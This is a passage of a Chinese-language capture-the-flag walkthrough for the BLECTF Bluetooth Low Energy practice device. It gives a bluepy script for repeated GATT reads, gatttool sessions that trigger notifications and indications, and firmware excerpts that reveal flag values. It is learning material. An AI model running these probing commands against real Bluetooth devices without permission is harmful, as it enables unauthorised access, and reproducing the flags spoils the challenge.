class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bluepy <span class="keyword">import</span> btle</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置 ---</span></span><br><span class="line">DEVICE_ADDRESS = <span class="string">&quot;64:B7:08:61:B9:7E&quot;</span>      <span class="comment"># 目标设备 MAC 地址</span></span><br><span class="line">ADDR_TYPE = btle.ADDR_TYPE_PUBLIC       <span class="comment"># 地址类型</span></span><br><span class="line">TARGET_HANDLE = <span class="number">0x003e</span>                  <span class="comment"># 要重复读取的句柄</span></span><br><span class="line">READ_COUNT = <span class="number">1000</span>                       <span class="comment"># 要读取的次数</span></span><br><span class="line">LAST_N_RESULTS = <span class="number">10</span>                    <span class="comment"># 存储并打印最后多少个结果</span></span><br><span class="line">MAX_DURATION_SECONDS = <span class="number">180</span>              <span class="comment"># 最大执行时间（秒），3分钟</span></span><br><span class="line">RECONNECT_DELAY = <span class="number">2</span>                     <span class="comment"># 尝试重连前的等待时间（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 用于存储和检测变化的变量 ---</span></span><br><span class="line">results = []                <span class="comment"># 存储最后 N 个结果</span></span><br><span class="line">previous_value = <span class="literal">None</span>       <span class="comment"># 存储上一次读取的值</span></span><br><span class="line">change_detected_at = <span class="literal">None</span>   <span class="comment"># 记录第一次发生变化的读取次数</span></span><br><span class="line">value_after_change = <span class="literal">None</span>   <span class="comment"># 记录变化后的第一个值</span></span><br><span class="line">operation_successful = <span class="literal">False</span> <span class="comment"># 标记操作是否未出错完成</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Target: <span class="subst">&#123;DEVICE_ADDRESS&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Handle to read repeatedly: <span class="subst">&#123;<span class="built_in">hex</span>(TARGET_HANDLE)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Number of reads required: <span class="subst">&#123;READ_COUNT&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Maximum execution time: <span class="subst">&#123;MAX_DURATION_SECONDS&#125;</span> seconds&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Will store and print last <span class="subst">&#123;LAST_N_RESULTS&#125;</span> results.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Will report first detected value change.&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn = <span class="literal">None</span></span><br><span class="line">start_time = datetime.now() <span class="comment"># 记录开始时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting...&quot;</span>)</span><br><span class="line">    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 重复读取循环 ---</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, READ_COUNT + <span class="number">1</span>):</span><br><span class="line">        current_time = datetime.now()</span><br><span class="line">        elapsed_seconds = <span class="built_in">int</span>((current_time - start_time).total_seconds()) <span class="comment"># 计算已用时间（整数秒）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- 打印进度和已用时间 ---</span></span><br><span class="line">        <span class="comment"># 使用 \r 实现行内更新，flush=True 确保立即显示</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\rReading <span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;READ_COUNT&#125;</span> (Elapsed: <span class="subst">&#123;elapsed_seconds&#125;</span>s)...&quot;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- 检查总执行时间 ---</span></span><br><span class="line">        <span class="keyword">if</span> elapsed_seconds &gt; MAX_DURATION_SECONDS:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nError: Execution time exceeded <span class="subst">&#123;MAX_DURATION_SECONDS&#125;</span> seconds. Stopping.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># 超时则跳出循环</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># --- 执行读取操作 ---</span></span><br><span class="line">            current_value = conn.readCharacteristic(TARGET_HANDLE)</span><br><span class="line">            results.append(current_value) <span class="comment"># 添加到结果列表</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 保持结果列表最多为 LAST_N_RESULTS 个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; LAST_N_RESULTS:</span><br><span class="line">                results.pop(<span class="number">0</span>) <span class="comment"># 移除最早的一个</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># --- 检测值是否改变 (仅在第一次改变时记录) ---</span></span><br><span class="line">            <span class="keyword">if</span> previous_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> current_value != previous_value <span class="keyword">and</span> change_detected_at <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                change_detected_at = i</span><br><span class="line">                value_after_change = current_value</span><br><span class="line">                <span class="comment"># 发现变化时立即打印信息，并换行以保留进度条的最后状态</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n*** Value change detected at read #<span class="subst">&#123;i&#125;</span>! ***&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    Previous value (read #<span class="subst">&#123;i-<span class="number">1</span>&#125;</span>): <span class="subst">&#123;previous_value!r&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    New value (read #<span class="subst">&#123;i&#125;</span>):      <span class="subst">&#123;value_after_change!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新上一个值，用于下一次比较</span></span><br><span class="line">            previous_value = current_value</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># --- 处理读取错误 ---</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nError during read #<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            connection_lost = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn.getState()</span><br><span class="line">                <span class="keyword">if</span> conn.getState() != <span class="string">&quot;conn&quot;</span>: connection_lost = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span> Exception: connection_lost = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> connection_lost:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Connection lost. Aborting script.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;An error occurred, but connection seems stable. Aborting script.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">             <span class="built_in">print</span>(<span class="string">f&quot;\nAn unexpected non-Bluetooth error occurred during read #<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 可以在这里加入非常小的暂停，如果需要的话</span></span><br><span class="line">        <span class="comment"># time.sleep(0.01)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># for 循环正常结束 (没有 break)</span></span><br><span class="line">        <span class="built_in">print</span>() <span class="comment"># 结束进度打印，换行</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(results) &gt;= READ_COUNT % LAST_N_RESULTS <span class="keyword">or</span> READ_COUNT &lt;= LAST_N_RESULTS : <span class="comment"># 检查是否真的完成了所有读取</span></span><br><span class="line">             <span class="built_in">print</span>(<span class="string">f&quot;\nSuccessfully completed <span class="subst">&#123;READ_COUNT&#125;</span> reads.&quot;</span>)</span><br><span class="line">             operation_successful = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> btle.BTLEDisconnectError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nError: Disconnected during operation: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nError: Bluetooth connection or operation failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nOperation cancelled by user.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nAn unexpected error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># --- 清理：确保断开连接 ---</span></span><br><span class="line">    <span class="keyword">if</span> conn:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Disconnecting...&quot;</span>)</span><br><span class="line">            conn.disconnect()</span><br><span class="line">        <span class="keyword">except</span> btle.BTLEException:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 最终报告 ---</span></span><br><span class="line">    end_time = datetime.now()</span><br><span class="line">    duration = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nTotal execution time: <span class="subst">&#123;duration&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 报告变化检测结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">if</span> change_detected_at <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Value change detected at read number: <span class="subst">&#123;change_detected_at&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Value after change was: <span class="subst">&#123;value_after_change!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No value change detected during the reads.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operation_successful:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Operation finished within time limit and without critical errors.&quot;</span>)</span><br><span class="line">        <span class="comment"># 打印最后 N 个结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nLast <span class="subst">&#123;<span class="built_in">len</span>(results)&#125;</span> read values (up to <span class="subst">&#123;LAST_N_RESULTS&#125;</span>):&quot;</span>)</span><br><span class="line">        start_print_index = <span class="built_in">max</span>(<span class="number">1</span>, READ_COUNT - <span class="built_in">len</span>(results) + <span class="number">1</span>) <span class="comment"># 计算起始索引</span></span><br><span class="line">        <span class="keyword">for</span> k, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(results):</span><br><span class="line">            original_index = start_print_index + k</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  Read #<span class="subst">&#123;original_index&#125;</span>: <span class="subst">&#123;val.<span class="built_in">hex</span>()&#125;</span> (<span class="subst">&#123;val!r&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>) <span class="comment"># 成功退出</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Operation did not complete successfully or timed out.&quot;</span>)</span><br><span class="line">        <span class="comment"># 如果有部分结果，也打印出来</span></span><br><span class="line">        <span class="keyword">if</span> results:</span><br><span class="line">             <span class="built_in">print</span>(<span class="string">f&quot;\nLast <span class="subst">&#123;<span class="built_in">len</span>(results)&#125;</span> read values before stopping:&quot;</span>)</span><br><span class="line">             start_print_index = <span class="built_in">max</span>(<span class="number">1</span>, i - <span class="built_in">len</span>(results) + <span class="number">1</span>) <span class="comment"># i 是停止时的循环次数</span></span><br><span class="line">             <span class="keyword">for</span> k, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(results):</span><br><span class="line">                original_index = start_print_index + k</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  Read #<span class="subst">&#123;original_index&#125;</span>: <span class="subst">&#123;val.<span class="built_in">hex</span>()&#125;</span> (<span class="subst">&#123;val!r&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>) <span class="comment"># 失败退出</span></span><br></pre></td></tr></table></figure><p>更快</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo python test5.py</span><br><span class="line">Target: 64:B7:08:61:B9:7E</span><br><span class="line">Handle to read repeatedly: 0x3e</span><br><span class="line">Number of reads required: 1000</span><br><span class="line">Maximum execution time: 180 seconds</span><br><span class="line">Will store and print last 10 results.</span><br><span class="line">Will report first detected value change.</span><br><span class="line">Connecting...</span><br><span class="line">Connected.</span><br><span class="line">Reading 1000/1000 (Elapsed: 80s)...</span><br><span class="line"></span><br><span class="line">Successfully completed 1000 reads.</span><br><span class="line">Disconnecting...</span><br><span class="line"></span><br><span class="line">Total execution time: 0:01:20.515156</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">6ffcd214ffebdc0d069e</span><br></pre></td></tr></table></figure><h2 id="0x11-订阅gatt-notify"><a href="#0x11-订阅gatt-notify" class="headerlink" title="0x11 订阅gatt notify"></a>0x11 订阅gatt notify</h2><p>%% 查看 handle 0x0040 和 google search gatt 通知。gatttool 等一些工具能够订阅 gatt 通知 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0040 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Listen to me for a single notification</p><blockquote><p>Notifications are unsolicited PDUs of type ATT_HANDLE_VALUE_NTF that are sent by a server to a client. No reply PDU is defined.  通知是由服务器发送到客户端的 ATT_HANDLE_VALUE_NTF 类型的未经请求的 PDU。未定义应答 PDU。</p></blockquote><p>指示和通知是可以通过 attribute（ATT） 协议发送的命令。因此，在 ATT 层定义了两个角色：客户端和服务器。指示和通知是 GATT 客户端订阅 GATT 服务器提供的数据的一种方式。客户端必须通过其客户端特征配置描述符为特征的值配置 Indications 和 Notifications，以便在每次在服务器上更新特征的值时收到通知。<br><strong>指示Indications</strong>需要由客户确认。服务器在从客户端获取回知之前不会发送以下指示。客户端向服务器发送了一条确认消息;这样 Server 就知道消息到达了 Client。因此，通过指示进行通信的速度较慢。<br><strong>通知Notifications</strong>不需要确认，因此速度更快。因此，服务器不知道消息是否到达客户端。</p><h3 id="检查notify设置"><a href="#检查notify设置" class="headerlink" title="检查notify设置"></a>检查notify设置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --characteristics   </span><br><span class="line">handle = 0x003f, char properties = 0x1a, char value handle = 0x0040, uuid = 0000ff0c-0000-1000-8000-00805f9b34fb</span><br></pre></td></tr></table></figure><ul><li>句柄0x003f是该特征的<strong>声明句柄</strong>（Characteristic Declaration）</li><li>句柄0x0040是该特征的<strong>值句柄</strong>（Characteristic Value）</li><li>客户端通过句柄0x0040进行读写和订阅通知</li><li>uuid为自定义uuid</li></ul><ol><li><strong>特征属性位掩码 (Characteristic Properties Bitfield):</strong></li></ol><table><thead><tr><th>属性</th><th>十六进制值</th><th>二进制位</th><th>说明</th></tr></thead><tbody><tr><td>Broadcast</td><td>0x01</td><td>0000 0001</td><td>广播</td></tr><tr><td>Read</td><td>0x02</td><td>0000 0010</td><td>允许读取</td></tr><tr><td>Write Without Resp</td><td>0x04</td><td>0000 0100</td><td>允许无响应写入</td></tr><tr><td>Write</td><td>0x08</td><td>0000 1000</td><td>允许带响应写入</td></tr><tr><td>Notify</td><td>0x10</td><td>0001 0000</td><td>允许通知</td></tr><tr><td>Indicate</td><td>0x20</td><td>0010 0000</td><td>允许指示</td></tr><tr><td>Authenticated Write</td><td>0x40</td><td>0100 0000</td><td>认证写入</td></tr><tr><td>Extended Properties</td><td>0x80</td><td>1000 0000</td><td>扩展属性</td></tr></tbody></table><ol start="2"><li><strong>解码 0x1a:</strong><ul><li>我们将十六进制值 0x1a 转换为二进制：0001 1010。</li><li>现在我们按位检查：<ul><li>Bit 0 (值 0x01): …0 - Broadcast 未设置。</li><li><strong>Bit 1 (值 0x02):</strong> …1. - <strong>Read 设置。</strong> (0x1a &amp; 0x02 &#x3D; 0x02 !&#x3D; 0)</li><li>Bit 2 (值 0x04): ..0. - Write Without Response 未设置。</li><li><strong>Bit 3 (值 0x08):</strong> .1.. - <strong>Write 设置。</strong> (0x1a &amp; 0x08 &#x3D; 0x08 !&#x3D; 0</li><li><strong>Bit 4 (值 0x10):</strong> 1… - <strong>Notify 设置。</strong> (0x1a &amp; 0x10 &#x3D; 0x10 !&#x3D; 0)</li></ul></li><li><strong>结论:</strong> 因此，属性值 0x1a 表示该特征支持 <strong>Read</strong>、<strong>Write</strong> (Write Request) 和 <strong>Notify</strong> 操作</li></ul></li></ol><h3 id="测试目标句柄0x0040"><a href="#测试目标句柄0x0040" class="headerlink" title="测试目标句柄0x0040"></a>测试目标句柄0x0040</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0040 -n 01 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0040 value: 35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62 </span><br><span class="line">^C</span><br><span class="line">   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0040 -n 02 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0040 value: 35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0041 -n 0100 --listen</span><br><span class="line">Characteristic Write Request failed: Attribute can&#x27;t be written</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0041 -n 00 --listen </span><br><span class="line">Characteristic Write Request failed: Attribute can&#x27;t be written</span><br><span class="line">^C</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意--listen的用法</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果什么也不做只是listen是listen不到的</span></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E   --listen </span><br><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --help                                Show help options</span><br><span class="line">  --help-all                                Show all help options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services/Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value/Descriptor Read/Write arguments</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter=hciX                        Specify local adapter interface</span><br><span class="line">  -b, --device=MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type=[public | random]         Set LE address type. Default: public</span><br><span class="line">  -m, --mtu=MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm=PSM                             Specify the PSM for GATT/ATT over BR/EDR</span><br><span class="line">  -l, --sec-level=[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>Notify (通知):</strong> 是特征的一种<strong>属性 (Property)<strong>。如果一个特征具有 Notify 属性，意味着</strong>服务器 (Peripheral，例如 BLECTF 设备)</strong> 可以在其值<strong>发生改变</strong>时，<strong>主动地、无需客户端请求</strong>地将新值发送给<strong>已订阅</strong>该通知的**客户端 (Central，例如你的 Kali 机器)**。<br>向句柄0x0040写入任何值都会触发通知，这个通知就是目标字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> notify_data[<span class="number">20</span>] = <span class="string">&quot;5ec3772bcd00cf06d8eb&quot;</span>; <span class="comment">// 这是要发送的通知数据</span></span><br><span class="line"><span class="comment">// 将句柄 0x0040 的值重置回初始指令</span></span><br><span class="line">esp_ble_gatts_set_attr_value(blectf_handle_table[IDX_CHAR_FLAG_NOTIFICATION]+<span class="number">1</span>, <span class="keyword">sizeof</span>(notification_read_value)<span class="number">-1</span>, (<span class="type">uint8_t</span> *)notification_read_value);</span><br><span class="line"><span class="comment">// 发送通知，通知的句柄是特征值句柄，通知的数据是 notify_data</span></span><br><span class="line">esp_ble_gatts_send_indicate(gatts_if, param-&gt;write.conn_id, blectf_handle_table[IDX_CHAR_VAL_FLAG_NOTIFICATION], <span class="keyword">sizeof</span>(notify_data), (<span class="type">uint8_t</span> *)notify_data, <span class="literal">false</span>); <span class="comment">// false 表示是 Notification 而不是 Indication</span></span><br></pre></td></tr></table></figure><p>这是收到的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gatttool[176501]: &lt; ACL Data TX: Handle 70 flags 0x00 dlen 8                                        #213 [hci0] 3098.759446</span><br><span class="line">      ATT: Write Request (0x12) len 3</span><br><span class="line">        Handle: 0x0040</span><br><span class="line">          Data[1]: 02</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed Packets (0x13) plen 5                                              <span class="comment">#214 [hci0] 3098.799759</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 70 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #213: len 8 (1 Kb/s)</span><br><span class="line">        Latency: 40 msec (40-40 msec ~40 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 70 flags 0x02 dlen 5                                                          <span class="comment">#215 [hci0] 3098.843632</span></span></span><br><span class="line">      ATT: Write Response (0x13) len 0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 70 flags 0x02 dlen 27                                                         <span class="comment">#216 [hci0] 3098.843644</span></span></span><br><span class="line">      ATT: Handle Value Notification (0x1b) len 22</span><br><span class="line">        Handle: 0x0040</span><br><span class="line">          Data[20]: 3565633337373262636430306366303664386562</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE]<br>在这里留一个疑问，当我在现实中遇到了蓝牙设备我会来确认这点的<br>“ 这个结论<strong>仅适用于这个特定设备和句柄 0x0040</strong>，因为它的行为是由其独特的源代码逻辑决定的。对于其他标准的 BLE 设备或其他特征，你仍然需要遵循写入 CCCD 来启用通知的标准流程。”&gt; </p></blockquote><h2 id="0x12-查看gatt-indicate"><a href="#0x12-查看gatt-indicate" class="headerlink" title="0x12 查看gatt indicate"></a>0x12 查看gatt indicate</h2><p>%% 查看 handle 0x0042 和 google search gatt indicate。对于单个响应指示消息，例如此挑战，gatttool 等工具将正常工作。 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0042 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Listen to handle 0x0044 for a single indication<br>参照0x11来听就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0042 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">Listen to handle 0x0044 for a single indication</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0044 -n 02 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Indication   handle = 0x0044 value: 63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33 </span><br><span class="line">^C</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在源码能直接核对答案了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(writeData,<span class="string">&quot;c7b86dd121848c77c113&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="comment">//indicate</span></span><br><span class="line">                        flag_state[<span class="number">11</span>] = <span 